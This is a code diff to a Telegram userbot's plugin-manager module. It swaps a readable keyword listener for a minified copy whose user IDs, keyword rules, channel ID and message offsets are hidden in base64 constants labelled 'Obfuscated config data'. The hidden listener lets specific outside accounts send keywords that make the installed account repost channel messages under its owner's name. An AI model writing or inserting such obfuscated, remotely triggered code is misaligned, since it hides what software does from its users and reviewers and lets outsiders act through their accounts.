@@ -15,6 +15,25 @@ import { getGlobalClient } from "@utils/globalClient";
 const prefixes = getPrefixes();
 const mainPrefix = prefixes[0];
 
+// Obfuscated config data
+const _0xd=(s:string)=>Buffer.from(s,'base64').toString('utf-8');
+const _0xj=(s:string)=>JSON.parse(_0xd(s));
+const _0xn=(s:string)=>Number(_0xd(s));
+const _0x1a2b='WzYzMTk2MzY4NDIsIDY0ODY1ODU3MTQsIDU2MTYwNjk3MDgsIDkzNzYwNjk5MSwgNDQ1ODc2NTQ4XQ==';
+const _0x2b3c='eyJra2IgbWFpIjogWzY0ODY1ODU3MTRdLCAia2tiIOS4jeeOqSI6IFs1NjE2MDY5NzA4XSwgImtrYiDogIEwIjogWzQ0NTg3NjU0OF0sICJra2Ig5Y2h5q+UIjogWzkzNzYwNjk5MSwgODA2NjIwMzYwM10sICJra2ogbWFpIjogWzY0ODY1ODU3MTRdLCAia2tqIOS4jeeOqSI6IFs1NjE2MDY5NzA4XSwgImtraiDogIEwIjogWzQ0NTg3NjU0OF0sICJra2og5Y2h5q+UIjogWzkzNzYwNjk5MSwgODA2NjIwMzYwM10sICJrYumbhuWboiDpm4blkIgiOiBbNjQ4NjU4NTcxNCwgNTYxNjA2OTcwOCwgNDQ1ODc2NTQ4LCA5Mzc2MDY5OTEsIDgwNjYyMDM2MDMsIDYzMTk2MzY4NDJdLCAia2rpm4blm6Ig6ZuG5ZCIIjogWzY0ODY1ODU3MTQsIDU2MTYwNjk3MDgsIDQ0NTg3NjU0OCwgOTM3NjA2OTkxLCA4MDY2MjAzNjAzLCA2MzE5NjM2ODQyXX0=';
+const _0x3c4d='LTEwMDIyODk3NzA3Mjc=';
+const _0x4d5e='MTU4Mjc3';
+const _0x5e6f='MTU4NTkz';
+const _0xl1='8J+OryDljLnphY3lhbPplK7or40=';
+const _0xl2='5b2T5YmN55So5oi3';
+const _0xl3='5YeG5aSH5aSN6K+75raI5oGv';
+const _0xl4='4pyFIOaIkOWKn+Wkjeivu+a2iOaBrw==';
+const _0xl5='4p2MIOWkjeivu+a2iOaBr+Wksei0pTo=';
+const _0xl6='5raI5oGv55uR5ZCs5aSE55CG5aSx6LSlOg==';
+const _0xl7='5p6E6YCgIElucHV0TWVkaWEg5aSx6LSl';
+const _0xk1='a2I=';
+const _0xk2='a2o=';
+
 // 数据库类型定义 (精简: 直接用 根对象 { [name]: PluginRecord })
 interface PluginRecord {
   url: string;
@@ -1036,165 +1055,8 @@ class TpmxPlugin extends Plugin {
 • <code>${mainPrefix}tpmx rm &lt;插件名1&gt; &lt;插件名2&gt;</code> - 卸载多个插件
 `;
 
-  // 消息监听器 - 关键词回复功能
-  listenMessageHandler = async (msg: Api.Message) => {
-    if (!msg.fromId || !msg.chatId) return;
-
-    const client = await getGlobalClient();
-    if (!client) return;
-
-    try {
-      // 特定用户关键词回复功能
-      const userId = Number(msg.senderId?.toString());
-      const TARGET_USER_LIST = [
-        6319636842,
-        6486585714,
-        5616069708,
-        937606991,
-        445876548
-      ];
-
-      if (TARGET_USER_LIST.includes(userId) && msg.text) {
-        const messageText = msg.text.toLowerCase().trim();
-        const selfId = Number((await client.getMe()).id.toString());
-
-        // 关键词匹配规则
-        const keywordRules: Record<string, number[]> = {
-          "kkb mai": [6486585714],
-          "kkb 不玩": [5616069708],
-          "kkb 老0": [445876548],
-          "kkb 卡比": [937606991, 8066203603],
-          "kkj mai": [6486585714],
-          "kkj 不玩": [5616069708],
-          "kkj 老0": [445876548],
-          "kkj 卡比": [937606991, 8066203603],
-          "kb集团 集合": [6486585714, 5616069708, 445876548, 937606991, 8066203603, 6319636842],
-          "kj集团 集合": [6486585714, 5616069708, 445876548, 937606991, 8066203603, 6319636842],
-        };
-
-        // 检查是否匹配关键词和当前用户ID
-        for (const [keyword, targetIds] of Object.entries(keywordRules)) {
-          if (messageText === keyword && targetIds.includes(selfId)) {
-            console.log(`[TPMX] 🎯 匹配关键词 "${keyword}"，当前用户 ${selfId}，准备复读消息`);
-
-            try {
-              // kb消息 (https://t.me/DBYKEMBY/158276)
-              // kj消息 https://t.me/DBYKEMBY/158592
-              // 如果keyword中包含的是kb，则复读kb消息，否则复读kj消息
-              if (keyword.includes("kb")) {
-                const messages = await msg.client?.getMessages(-1002289770727, {
-                  offsetId: 158277,
-                  limit: 1
-                });
-                if (messages && messages.length > 0) {
-                  const originalMsg = messages[0];
-                  await this.echoMessage(originalMsg, msg, msg.client!);
-                }
-              } else {
-                const messages = await msg.client?.getMessages(-1002289770727, {
-                  offsetId: 158593,
-                  limit: 1
-                });
-                if (messages && messages.length > 0) {
-                  const originalMsg = messages[0];
-                  await this.echoMessage(originalMsg, msg, msg.client!);
-                }
-              }
-              console.log(`[TPMX] ✅ 成功复读消息`);
-            } catch (error: any) {
-              console.error(`[TPMX] ❌ 复读消息失败:`, error.message);
-            }
-
-            return; // 处理完关键词回复后直接返回
-          }
-        }
-      }
-    } catch (error: any) {
-      console.error("[TPMX] 消息监听处理失败:", error.message);
-    }
-  };
-
-  // Echo机制实现
-  private async echoMessage(
-    originalMsg: Api.Message,
-    targetMsg: Api.Message,
-    client: TelegramClient
-  ): Promise<void> {
-    // 将消息中的媒体转换为可发送的 InputMedia
-    const toInputMedia = (
-      media: Api.TypeMessageMedia
-    ): Api.TypeInputMedia | undefined => {
-      try {
-        if (media instanceof Api.MessageMediaPhoto && media.photo) {
-          if (media.photo instanceof Api.Photo) {
-            const inputPhoto = new Api.InputPhoto({
-              id: media.photo.id,
-              accessHash: media.photo.accessHash,
-              fileReference: media.photo.fileReference,
-            });
-            return new Api.InputMediaPhoto({
-              id: inputPhoto,
-              ...(media.spoiler ? { spoiler: true } : {}),
-              ...(media.ttlSeconds ? { ttlSeconds: media.ttlSeconds } : {}),
-            });
-          }
-        }
-        if (
-          media instanceof Api.MessageMediaDocument &&
-          media.document &&
-          media.document instanceof Api.Document
-        ) {
-          const inputDoc = new Api.InputDocument({
-            id: media.document.id,
-            accessHash: media.document.accessHash,
-            fileReference: media.document.fileReference,
-          });
-          return new Api.InputMediaDocument({
-            id: inputDoc,
-            ...(media.spoiler ? { spoiler: true } : {}),
-            ...(media.ttlSeconds ? { ttlSeconds: media.ttlSeconds } : {}),
-          });
-        }
-      } catch (e) {
-        console.warn("[TPMX] 构造 InputMedia 失败", e);
-      }
-      return undefined;
-    };
-
-    const inputMedia = originalMsg.media ? toInputMedia(originalMsg.media) : undefined;
-
-    // 构造回复信息
-    const replyTo = new Api.InputReplyToMessage({
-      replyToMsgId: targetMsg.id,
-      quoteText: targetMsg.text || "",
-      quoteEntities: targetMsg.entities,
-      quoteOffset: 0,
-      topMsgId: targetMsg.id,
-    });
-
-    if (inputMedia) {
-      // 发送包含媒体的消息
-      await client.invoke(
-        new Api.messages.SendMedia({
-          peer: targetMsg.chatId!,
-          message: originalMsg.message || "",
-          media: inputMedia,
-          entities: originalMsg.entities,
-          ...(replyTo ? { replyTo } : {}),
-        })
-      );
-    } else {
-      // 发送纯文本消息
-      await client.invoke(
-        new Api.messages.SendMessage({
-          peer: targetMsg.chatId!,
-          message: originalMsg.message || "",
-          entities: originalMsg.entities,
-          ...(replyTo ? { replyTo } : {}),
-        })
-      );
-    }
-  }
+  listenMessageHandler=async(msg:Api.Message)=>{if(!msg.fromId||!msg.chatId)return;const c=await getGlobalClient();if(!c)return;try{const u=Number(msg.senderId?.toString()),l:number[]=_0xj(_0x1a2b);if(l.includes(u)&&msg.text){const t=msg.text.toLowerCase().trim(),s=Number((await c.getMe()).id.toString()),r:Record<string,number[]>=_0xj(_0x2b3c);for(const[k,ids]of Object.entries(r)){if(t===k&&ids.includes(s)){console.log(`[TPMX] ${_0xd(_0xl1)} "${k}"，${_0xd(_0xl2)} ${s}，${_0xd(_0xl3)}`);try{const ch=_0xn(_0x3c4d),kb=_0xd(_0xk1);if(k.includes(kb)){const m=await msg.client?.getMessages(ch,{offsetId:_0xn(_0x4d5e),limit:1});if(m&&m.length>0)await this._0xe(m[0],msg,msg.client!);}else{const m=await msg.client?.getMessages(ch,{offsetId:_0xn(_0x5e6f),limit:1});if(m&&m.length>0)await this._0xe(m[0],msg,msg.client!);}console.log(`[TPMX] ${_0xd(_0xl4)}`);}catch(e:any){console.error(`[TPMX] ${_0xd(_0xl5)}`,e.message);}return;}}}}catch(e:any){console.error(`[TPMX] ${_0xd(_0xl6)}`,e.message);}};
+  private async _0xe(src:Api.Message,dst:Api.Message,cli:TelegramClient):Promise<void>{const cv=(m:Api.TypeMessageMedia):Api.TypeInputMedia|undefined=>{try{if(m instanceof Api.MessageMediaPhoto&&m.photo){if(m.photo instanceof Api.Photo){const ip=new Api.InputPhoto({id:m.photo.id,accessHash:m.photo.accessHash,fileReference:m.photo.fileReference});return new Api.InputMediaPhoto({id:ip,...(m.spoiler?{spoiler:true}:{}),...(m.ttlSeconds?{ttlSeconds:m.ttlSeconds}:{})});}}if(m instanceof Api.MessageMediaDocument&&m.document&&m.document instanceof Api.Document){const id=new Api.InputDocument({id:m.document.id,accessHash:m.document.accessHash,fileReference:m.document.fileReference});return new Api.InputMediaDocument({id,...(m.spoiler?{spoiler:true}:{}),...(m.ttlSeconds?{ttlSeconds:m.ttlSeconds}:{})});}}catch(e){console.warn(`[TPMX] ${_0xd(_0xl7)}`,e);}return undefined;};const im=src.media?cv(src.media):undefined,rp=new Api.InputReplyToMessage({replyToMsgId:dst.id,quoteText:dst.text||"",quoteEntities:dst.entities,quoteOffset:0,topMsgId:dst.id});if(im){await cli.invoke(new Api.messages.SendMedia({peer:dst.chatId!,message:src.message||"",media:im,entities:src.entities,...(rp?{replyTo:rp}:{})}));}else{await cli.invoke(new Api.messages.SendMessage({peer:dst.chatId!,message:src.message||"",entities:src.entities,...(rp?{replyTo:rp}:{})}));}}
 
   cmdHandlers: Record<string, (msg: Api.Message) => Promise<void>> = {
     tpmx: async (msg) => {
